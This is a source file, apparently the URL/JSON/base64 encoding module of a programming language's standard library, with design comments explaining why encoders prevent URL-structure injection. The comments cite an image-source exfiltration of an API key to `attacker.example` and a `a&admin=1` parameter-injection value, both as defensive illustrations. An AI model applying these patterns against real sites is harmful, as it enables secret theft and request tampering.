# Encoding a value so that it survives being put inside something else.
#
# ⚠️ WHY THIS IS NOT A CONVENIENCE. §14G.1.3(c)'s sink list is closed at
# seven, and sink 7 is the outbound request: a URL-bearing argument on any
# element — `href`, `src`, and the sixteen others `zdc-hir/src/url.rs`
# names — is a place a value chooses the host the browser sends to. It is
# a separate sink from the view, and E-IFC-11 is a separate diagnostic
# from E-IFC-05, because the two catch different escapes. `Image source is
# apiKey` renders no visible text and appears in no response body, and the
# browser still fetches `https://attacker.example/<key>` before paint.
# That was a working exfiltration and STATUS.md records it as one.
#
# The flow pass closes that hole for a **secret**, and closes it
# completely: there is no declassification that reaches a URL. What no
# analysis closes is the ordinary value that arrives at a URL malformed,
# because it was concatenated in. `"q=" + typed` where `typed` holds
# `a&admin=1` is two parameters and not one, and neither the flow pass nor
# `safeUrl` has an opinion about it: the first is about secrecy and the
# second about the scheme, and this is about the structure in between.
#
# So an encoder is the affordance that makes the safe spelling the short
# one. `queryPart` below is one call where the concatenation is three
# tokens, and it is the spelling a program reaches for **instead** of
# building a URL out of `+`. It composes with the sink rather than
# competing with it: the flow pass still refuses a secret that reaches a
# URL after passing through `urlEncoded`, because encoding a secret does
# not make it public, and that is the right answer — an encoded key is
# still a key at the far end.
#
# ⚠️ ALL THREE ARE PRIMITIVES, AND THE REASON IS ONE REASON. Each is a
# statement about the **bytes** of a `Text`, and the language has no way
# to observe a byte or even a code point's number. `textAt` gives back a
# one character `Text`, not the number that character is, so a ZDeceptron
# definition cannot begin: percent-encoding needs the UTF-8 encoding of a
# character, base64 needs its bytes six at a time, and JSON's escape for a
# control character needs its code point in hexadecimal. §17.4.10 already
# named "inspecting a `Text`" as the thing the language cannot do; this is
# the same finding one level further down.
#
# All three carry `gives pure`, and that is a claim worth making out loud
# rather than by omission: an encoder is a function of its argument, it
# reads nothing, and it returns the same text everywhere. So none of them
# raises the question of where an impure primitive may be called, and none
# of them depends on an answer to it.
#
# Encoding only, and deliberately. Decoding is a parse, so it can fail and
# would have to give an `Option`, and nothing in the language reads an
# inbound URL or an inbound JSON document yet. It belongs with the thing
# that needs it rather than ahead of it.

# `value` with every character that structures a URL replaced by its
# percent-encoded UTF-8 bytes. O(n).
#
# The component form, not the whole-URL form: `/`, `?`, `#`, `&` and `=`
# are all escaped, because inside a path segment or a parameter every one
# of them is data rather than syntax. There is no second function for the
# whole-URL form. A program builds a URL out of parts, and a `foreign`
# that escaped less would be a second spelling of one operation, which
# §4.1 refuses.
#
# The unreserved set — letters, digits, `-`, `_`, `.` and `~` — is left
# alone, so an ordinary word comes back unchanged.
foreign urlEncoded is anywhere
    from "zd:encode" as "url"
    takes of value is Text
    gives pure Text

# `value` as a JSON string, **quotes included**. O(n).
#
# The quotes are part of the answer because the answer is a JSON value
# ready to be concatenated into a body, not a fragment that still needs
# punctuation around it. A caller that has to add the quotes is a caller
# that can forget to.
#
# The quote and the backslash are the two escapes a reader thinks of, and
# they are not the reason this is a primitive: `replace` could do both.
# The control characters are the reason. The lexer's string rule admits no
# escapes, so no ZDeceptron literal can name a character below U+0020, and
# `replace` cannot match what nothing can write down.
foreign jsonEncoded is anywhere
    from "zd:encode" as "json"
    takes of value is Text
    gives pure Text

# `value`'s UTF-8 bytes in the standard base64 alphabet, padded with `=`.
# O(n).
#
# Over the bytes, which is what makes it total. The platform's own `btoa`
# is not: it reads its argument as one byte per code unit and throws on
# anything above U+00FF, so `base64Encoded of "é"` would be an exception
# rather than a value.
foreign base64Encoded is anywhere
    from "zd:encode" as "base64"
    takes of value is Text
    gives pure Text

# One query parameter, both halves encoded. O(n).
#
# The name as well as the value. A parameter name that came from data is
# no safer than a value that did, and a function that encoded one half
# would teach that it is.
function queryPart with name, value
    give (urlEncoded of name) + "=" + (urlEncoded of value)

# Every entry of `parameters` as a query string, in insertion order, with
# `&` between and both halves of each entry encoded. O(n) in the total
# length.
#
# An empty map is the empty text and not a stray `&`, which is the case a
# fold that always writes its separator first gets wrong.
function queryText of parameters
    give queryFrom with parameters is parameters, index is 0, taken is ""

function queryFrom with parameters, index, taken
    when mapKeyAt with value is parameters, index is index
        None
            give taken
        Some with key
            with part is (queryPart with name is key, value is (atOr with table is parameters, key is key, fallback is ""))
            if index is 0
                give queryFrom with parameters is parameters, index is 1, taken is part
            give queryFrom with parameters is parameters, index is index + 1, taken is taken + "&" + part
